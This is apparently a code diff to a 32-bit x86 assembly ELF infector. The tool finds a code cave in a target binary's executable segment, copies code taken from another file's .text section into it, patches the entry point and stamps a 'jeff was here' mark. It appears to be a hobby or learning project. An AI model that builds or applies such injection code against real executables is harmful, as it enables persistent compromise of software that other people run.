@@ -1,4 +1,4 @@
-;open flag value
+;openx flag value
 %define O_RDONLY 0
 %define O_RDWR 2
 
@@ -101,7 +101,7 @@ section .data
 	bad_open_len equ $ - bad_open
 
 	; is an elf file ?
-	bad_elf db "file is not an elf !", 0x0a, 0x00
+	bad_elf db "file is not an elf :(", 0x0a, 0x00
 	bad_elf_len equ $ - bad_elf
 
 	; is stated ?
@@ -133,6 +133,11 @@ section .data
 	; was the marker found ?
 	no_marker db "no mark was found, make sure you follow the expectations at the Readme file!", 0x0a, 0x00
 	no_marker_len equ $ - no_marker
+
+	; was the executable segment found ?
+	found_executable_segment db "the executable segment was found!", 0x0a, 0x00
+	found_executable_segment_len equ $ - found_executable_segment
+
 
 	; was any gap found ?
 	no_gap_found db "no gap was found :(", 0x0a, 0x00
@@ -264,8 +269,8 @@ mapping:
 	cmp eax, -1
 	; if we jumped to mmap_err we have to figure out if we mapped any of the files correctly so
 	; we know if we should unmap them before exiting, for that I'll use ebx
-	; pivot wasn't mapped -> ebx = 1
-	; elf wasn't mapped -> ebx = 0
+	; pivot wasn't mapped -> ebx = 0
+	; elf wasn't mapped -> ebx = 1
 	jne next_map
 	xor ebx, ebx
 	jmp mmap_err
@@ -333,11 +338,13 @@ finding_shellcode:
 	push eax
 	push shellcode_size
 	call find_shell ; returns a pointer to the .text sections, and initializes the shellcode_size variable
-	mov [shellcode], eax
 	test eax, eax	; shell = NULL ?
-	jne patching
+	jne next3
 	push ERR_NO_SHELL
 	jmp clean
+
+next3:
+	mov [shellcode], eax
 
 patching:
 	push eax; shellcode
@@ -394,12 +401,12 @@ no_segment:
 
 segment_found:
 	; now that we found the target segment, we have to find a suitable gap to store our shellcode
-	; segment offset in file
-	mov edx, [ebx + p_offset]
-	add edx, eax	; eax is the memory base of the file
-	push edx	; segment offset in memorry
-
-	push dword[ebx + p_filesz]
+	;; arguments for find_gap
+	push dword[pivot_data]
+	push ebx			; the executable segment header 
+	push dword[ebx + p_filesz]	; segment size 	; TODO : might add some checks for weird errors like
+							; section has a size of 0 and and number of segements
+							; and sections exceeds 0xffff
 	push dword[shellcode_size]
 
 	call find_gap
@@ -409,15 +416,12 @@ segment_found:
 	jmp clean
 
 next4:
+
 	; copying the shellcode
 	push eax ; the gap address
 	push dword[shellcode]
 	push dword[shellcode_size]
 	call copy_data
-
-	push shell_copied
-	push shell_copied_len
-	call print
 
 
 	; now all we have to do is :
@@ -427,7 +431,7 @@ next4:
 	; 	4 - ???
 	; 	5 - profit
 
-	;; patching the entry point
+	;; 1 - patch entry point
 	; eax has the gap offset in memorry, we have to get the gap offset in file, then add it to the old 
 	; entry point
 	; ebx should still have a Elf32_Phdr pointer to the executable segment and
@@ -443,12 +447,12 @@ next4:
 leaving_mark:
 	push marking
 	push marking_len
-	call print	;"leaving mark ..."
+	call print ;"leaving mark ..."
 	;
 	mov eax, [pivot_data]
-	add eax, 9	; pointing at EI_PAD
+	add eax, 9 ; pointing at EI_PAD
 	push eax
-	push mark	; the "jeff was here" thingy
+	push mark ; the "jeff was here" thingy
 	call strlen
 	push eax
 	call copy_data
@@ -584,7 +588,11 @@ copying_loop:
 	jmp copying_loop
 
 copied:
+	push shell_copied
+	push shell_copied_len
+	call print ; "shell copied!"
 	;restoring registers
+	add esp, 8
 	pop edx
 	pop ecx
 	pop edi
@@ -595,7 +603,7 @@ copied:
 	ret
 
 
-find_gap:	; void *find_gap(void *segment, DWORD seg_size, DWORD shellcode_size)
+find_gap:	; void *find_gap(void *data, void *segment_Phdr, DWORD seg_size, DWORD shellcode_size)
 
 	push ebp
 	mov ebp, esp
@@ -604,14 +612,38 @@ find_gap:	; void *find_gap(void *segment, DWORD seg_size, DWORD shellcode_size)
 	push ecx
 	push edx
 	;
+
+method1:	; checking between-segments gaps ; this should work most of the time duo to in-file alignement
+
+	mov eax, [ebp + 0x10]		; our target segment
+	mov ebx, [eax + p_offset]
+	add ebx, [eax + p_filesz] 	; we have a pointer to the end the executable segment in file
+
+	; now getting the offset of the next segment
+
+	add eax, Elf32_Phdr_size	; segment ++
+	mov ecx, [eax + p_offset] 	; pointer to the start of the next segment
+
+	sub ecx, ebx			; ecx should have the gap size now
+	cmp ecx, [ebp + 8]		; gap_size > shellcode_size ?
+	jl method2
+	; gap = ebx = (segment_Phdr -> offset + segment_Phdr -> filesz) + memmory base
+	add ebx, [ebp + 0x14]		; gap offset in file + memorry base = pointer to the gap in memorry
+	mov eax, ebx			; to return
+	jmp ret_gap
+
+
+method2:	; checking the in-segment 0-blocks
 	xor eax, eax		; the size of the current gap
-	mov ebx, [ebp + 0x10]	; void *segment in memorry
+	mov ebx, [ebp + 0x10]	; void *segment in memorry ; TODO this has to change the calculate the offset								; of the segment, seince we're now pushing the segment
+						      ; header instead of the actual offset
+	mov ebx, [ebx + p_offset]
+	add ebx, [ebp + 0x14]
+	
 	mov ecx, -1		; the loop counter
 	mov edx, [ebp + 0xc]	; segment size
 
-parsing_data:	; now there is a better method to do this, by getting the next segment offset and substracting
-		; it from the current segment base or smtg like this, but I don't really understand why/how
-		; that works
+parsing_data:
 
 	inc ecx			; i++
 	cmp ecx, edx		; i > seg_size ?
@@ -639,7 +671,7 @@ no_gap:
 	push no_gap_found
 	push no_gap_found_len
 	call print
-	xor eax, eax		; gap = NULL
+	xor eax, eax ; gap = NULL
 	add esp, 8
 	jmp ret_gap
 
@@ -708,10 +740,11 @@ ret_patch:
 find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
 	push ebp
 	mov ebp, esp
-	sub esp, 0x8
-	; we'll need to declare 2 variables in this routine
-	;[ebp - 4] -> Elf32_Shdr *section = (char *)data + h_ptr -> e_shoff
-	;[ebp - 8] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum
+	sub esp, 0xc
+	; some variables here are
+	;[ebp - 4] -> Elf32_Shdr *section = (char *)data + h_ptr -> e_shoff (done)
+	;[ebp - 8] -> Elf32_Shdr *text; uinitialized
+	;[ebp - 0xc] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum (done)
 	;2 bytes for alignements
 
 	;saving registers
@@ -730,7 +763,7 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	;;
 
 
-	;;putting a pointer to the string index table offset in memorry in edx so we can use it later
+	;;taking care of the string index table section pointer (@ ebp - 0xc)
 	mov ax, word[ebx + e_shstrndx]
 	and eax, 0xffff
 	mov ecx, Elf32_Shdr_size
@@ -744,10 +777,10 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov edx, eax		; from now on, edx will have the pointer to the string index table, we're gonna
 				; use this later
 
-	;;taking care of section_count (@ ebp - 0x8)
+	;;taking care of section_count (@ ebp - 0xc)
 	mov ax, [ebx + e_shnum]
 	and eax, 0xffff
-	mov [ebp - 0x8], eax
+	mov [ebp - 0xc], eax
 	;
 
 
@@ -772,7 +805,7 @@ parsing_loop:
 	;;
 
 	inc ecx
-	cmp cx, word[ebp - 0x8] ; e_shnum
+	cmp cx, word[ebp - 0xc] ; e_shnum
 	jne parsing_loop
 
 no_text_section:
@@ -781,7 +814,7 @@ no_text_section:
 	push no_text
 	push no_text_len
 	call print
-	add esp, 0x14
+	add esp, 0x18
 	jmp ret_text_section
 
 
@@ -797,7 +830,7 @@ found_text_section:;
 	mov ecx, [ecx + sh_size]
 	mov [ebx], ecx
 	;
-	add esp, 0xc
+	add esp, 0x10
 
 ret_text_section:
 	;restoring registers
@@ -811,7 +844,7 @@ ret_text_section:
 
 
 
-unmap:; void unmap(void *data, size_size)
+unmap:; void unmap(void *data, size_size) ; not used yet, TODO : use this function and close the files at the end of _start
 	push ebp
 	mov ebp, esp
 	;saving registers ; might not be necessary
@@ -855,7 +888,7 @@ close: ; void close(int fd);
 
 
 
-get_file_size:	; size_t get_file_size(int fd);
+get_file_size:	; void get_file_size(int fd);
 	push ebp
 	mov ebp, esp
 	sub esp, stat_size
@@ -923,21 +956,20 @@ strlen:; size_t strlen(char *buf);
 	mov ebp, esp
 	;saving registers
 	push ebx
-	push ecx
 	;
-	mov ecx, -1
+	mov eax, -1
 	mov ebx, [ebp + 0x8]
 loop:
-	inc ecx
-	cmp byte[ebx + ecx], 0
+	inc eax
+	cmp byte[ebx + eax], 0
 	jne loop
-	mov eax, ecx
 	;restoring registers
-	pop ecx
 	pop ebx
 	;
+	mov esp, ebp
 	pop ebp
 	ret
+
 
 
 is_target_elf: 	; int is_target_elf(void *data)
@@ -957,6 +989,9 @@ is_target_elf: 	; int is_target_elf(void *data)
 	jmp ret_arch
 
 good_elf_ptr:
+;	push good_elf
+;	push good_elf_len
+;	call print ; "file is indeed an elf"
 	; checking e_ident[ELFCLASS] ; eax still has the pointer to the mapped data
 	add eax, 4
 	cmp byte[eax], ELFCLASS32
@@ -970,6 +1005,9 @@ good_elf_ptr:
 	jmp ret_arch
 
 is_32_bit:
+	;push good_32_bit_elf
+	;push good_32_bit_elf_len
+	call print ; file is a 32 bit elf
 	xor eax, eax
 
 ret_arch:
@@ -1030,4 +1068,3 @@ exit:	;void exit(int return_stat)
 	pop ebx
 	inc eax
 	int 0x80
-
